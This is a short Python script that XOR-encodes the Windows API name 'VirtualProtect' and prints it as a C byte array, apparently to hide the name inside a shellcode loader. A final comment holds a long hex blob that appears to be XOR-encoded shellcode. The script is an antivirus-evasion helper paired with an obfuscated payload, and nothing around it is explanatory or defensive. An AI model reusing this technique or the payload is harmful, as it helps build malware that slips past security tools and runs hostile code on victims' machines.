import sys

original = "VirtualProtect"
key = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

def my_way(original, key):
    new_array = []
    key_len = len(key)
    j = 0
    for ora in original:
        if (j == key_len): j = 0
        #print(int(ora,16))
        new_array.append(chr(ord(ora) ^ ord(key[j])))
        j = j+1

    print("".join(new_array))

def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        print(i%len(key))
        current_key = key[i%len(key)]
        output_str += chr(ord(current) ^ ord(current_key))
    
    return output_str

def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

print("XOR: ", xor(original, key))
print("My_Way: ", my_way(original, key))

# its bloody samee bloody

print(printCiphertext(xor(original, key)))


# orr_string = "".join(new_array).replace('0x', '\\x')
# print(orr_string)

# \xc9\xdd\xb7\x35\x35\x35\x55\xbc\xd0\x4\xf5\x51\xbe\x65\x5\xbe\x67\x39\xbe\x67\x21\xbe\x47\x1d\x3a\x82\x7f\x13\x4\xca\x99\x9\x54\x49\x37\x19\x15\xf4\xfa\x38\x34\xf2\xd7\xc7\x67\x62\xbe\x67\x25\xbe\x7f\x9\xbe\x79\x24\x4d\xd6\x7d\x34\xe4\x64\xbe\x6c\x15\x34\xe6\xbe\x7c\x2d\xd6\xf\x7c\xbe\x1\xbe\x34\xe3\x4\xca\x99\xf4\xfa\x38\x34\xf2\xd\xd5\x40\xc3\x36\x48\xcd\xe\x48\x11\x40\xd1\x6d\xbe\x6d\x11\x34\xe6\x53\xbe\x39\x7e\xbe\x6d\x29\x34\xe6\xbe\x31\xbe\x34\xe5\xbc\x71\x11\x11\x6e\x6e\x54\x6c\x6f\x64\xca\xd5\x6a\x6a\x6f\xbe\x27\xde\xb8\x68\x5d\x6\x7\x35\x35\x5d\x42\x46\x7\x4\xc3\x5f\x27\x6c\x63\xd7\xc8\x53\xf2\x71\x11\x9\x34\x34\xb8\x71\x11\x25\xf3\x35\x71\x61\x65\x63\x63\x63\x73\x63\x7b\x63\x63\x66\x63\x5d\x4c\xf9\xa\xb3\xca\xe0\xbc\xd5\x7b\x63\x73\xca\x5\x5d\x3d\xb2\x28\x55\xca\xe0\x8e\xc5\x80\x97\x63\x5d\x93\xa0\x88\xa8\xca\xe0\x9\x33\x49\x3f\xb5\xce\xd5\x40\x30\x8e\x72\x26\x47\x5a\x5f\x35\x66\xca\xe0